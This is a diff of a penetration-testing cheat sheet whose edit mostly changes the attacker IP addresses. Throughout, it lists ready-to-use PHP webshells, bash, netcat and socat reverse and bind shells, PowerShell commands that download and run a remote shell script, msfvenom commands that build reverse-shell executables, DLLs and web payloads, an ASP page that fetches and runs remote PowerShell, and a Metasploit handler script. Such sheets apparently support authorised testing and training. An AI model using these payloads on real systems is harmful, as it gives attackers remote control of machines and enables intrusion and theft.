@@ -22,8 +22,8 @@ Kali ready-to-go webshells
 <?php $cmd=$_GET['cmd']; system($cmd);?>
 
 /*PHP to immediately pop a shell (linux-only)*/
-<?php $sock=fsockopen("192.168.1.1",443); exec("/bin/sh -i <&3 >&3 2>&3");?>
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.1/443 0>&1'");?>
+<?php $sock=fsockopen("192.168.119.1",443); exec("/bin/sh -i <&3 >&3 2>&3");?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.119.1/443 0>&1'");?>
 ```
 
 ###### Ready-to-go reverse shell payloads
@@ -44,26 +44,26 @@ https://netsec.ws/?p=337
 ###### Pop a shell from bash
 ```
 Bash
-$ bash -i >& /dev/tcp/192.168.1.1/443 0>&1
+$ bash -i >& /dev/tcp/192.168.119.1/443 0>&1
 
 Netcat
-$ nc -e /bin/bash 192.168.1.1 443
+$ nc -e /bin/bash 192.168.119.1 443
 ```
 
 ###### Powershell
 ```
 PS download payload and execute immediately
 $ powershell.exe -c IEX (New-Object System.Net.WebClient).DownloadString('
-http://192.168.1.1/Invoke-PowerShellTcp.ps1')
+http://192.168.119.1/Invoke-PowerShellTcp.ps1')
 $ powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('
-http://192.168.1.1/Invoke-PowerShellTcp.ps1')
+http://192.168.119.1/Invoke-PowerShellTcp.ps1')
 
 or newer variant:
-$ powershell.exe -c 'IEX(IWR http://10.10.10.10/Invoke-PowerShellTcp.ps1 -UseBasicParsing)'
+$ powershell.exe -c 'IEX(IWR http://192.168.1.1/Invoke-PowerShellTcp.ps1 -UseBasicParsing)'
 
 How to use powershell to pop a second connection with interactive shell
 Open a listener on 1 port and a web server with payload on another. Then run:
-$ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/Invoke-PowerShellTcp.ps1')"
+$ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.119.1/Invoke-PowerShellTcp.ps1')"
 ```
 
 ###### List msfvenom payload options
@@ -76,44 +76,44 @@ $ msfvenom -l formats
 ###### Windows payloads for in a python script
 ```
 Unstaged payload
-$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -b "\x00" -f python -v shellcode -a x86 --platform windows > payload.txt
+$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.1 LPORT=443 -b "\x00" -f python -v shellcode -a x86 --platform windows > payload.txt
 
 Staged payload
-$ msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=443 -b "\x00" -f python -v shellcode -a x86 --platform windows > payload.txt
+$ msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.1 LPORT=443 -b "\x00" -f python -v shellcode -a x86 --platform windows > payload.txt
 ```
 
 ###### Windows reverse shells
 ```
-$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f dll > msf.dll
-$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe > shell.exe
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.1 LPORT=443 -f dll > msf.dll
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.1 LPORT=443 -f exe > shell.exe
 ```
 
 ###### Linux reverse shells
 ```
 x86
-$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f elf > shell.elf
+$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.1 LPORT=443 -f elf > shell.elf
 x64
-$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f elf > shell.elf
-$ msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.1 LPORT=443 -f raw > shell.sh
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.1 LPORT=443 -f elf > shell.elf
+$ msfvenom -p cmd/unix/reverse_bash LHOST=192.168.119.1 LPORT=443 -f raw > shell.sh
 ```
-s
+
 ###### Some more reverse shells
 ```
 .php
-$ msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=443 -f raw > shell.php
+$ msfvenom -p php/reverse_php LHOST=192.168.119.1 LPORT=443 -f raw > shell.php
 .asp
-$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f asp > shell.asp
+$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.1 LPORT=443 -f asp > shell.asp
 .jsp
-$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f raw > shell.jsp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.1 LPORT=443 -f raw > shell.jsp
 .war
-$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f war > shell.war
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.1 LPORT=443 -f war > shell.war
 ```
 
 ###### Simple ASP(X?) payload without importing additional libraries
 ```
 <%
 Set s = CreateObject("WScript.Shell")
-Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.10.10:80/InvokePowerShellTcp.ps1')")
+Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://192.168.1.1:80/InvokePowerShellTcp.ps1')")
 o = cmd.StdOut.Readall()
 Response.write(o)
 >
@@ -125,20 +125,20 @@ Set up a listener
 $ nc -nvlp 443
 
 Connect to the listener (Windows)
-$ nc -nv 192.168.1.1 443 -e cmd.exe
+$ nc -nv 192.168.119.1 443 -e cmd.exe
 Connect to the listener (Linux)
-$ nc -nv 192.168.1.1 443 -e /bin/bash
+$ nc -nv 192.168.119.1 443 -e /bin/bash
 ```
 
 ###### Netcat bind shell
 ```
 Set up a listener (bind shell) (Windows target)
- $ nc -nvlp 10.10.10.10 443 -e cmd.exe
+ $ nc -nvlp 192.168.1.1 443 -e cmd.exe
 Set up a listener (bind shell) (Linux target)
- $ nc -nvlp 10.10.10.10 443 -e /bin/bash
+ $ nc -nvlp 192.168.1.1 443 -e /bin/bash
 
 Connect to the listener
-$ nc -nv 192.168.1.1 443
+$ nc -nv 192.168.119.1 443
 ```
 
 ###### Socat encrypted bind shell
@@ -147,14 +147,14 @@ Set up a listener (bind shell)(Linux target)
 $ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
 
 Connect to the listener
-$ socat -d -d - OPENSSL:10.10.10.10:443,verify=0
+$ socat -d -d - OPENSSL:192.168.1.1:443,verify=0
 ```
 
 ###### Metasploit Multi Handler (.rc script)
 ```
 use exploit/multi/handler
 set PAYLOAD windows/shell_reverse_tcp
-set LHOST 192.168.1.1
+set LHOST 192.168.119.1
 set LPORT 443
 set ExitOnSession false
 exploit -j -z
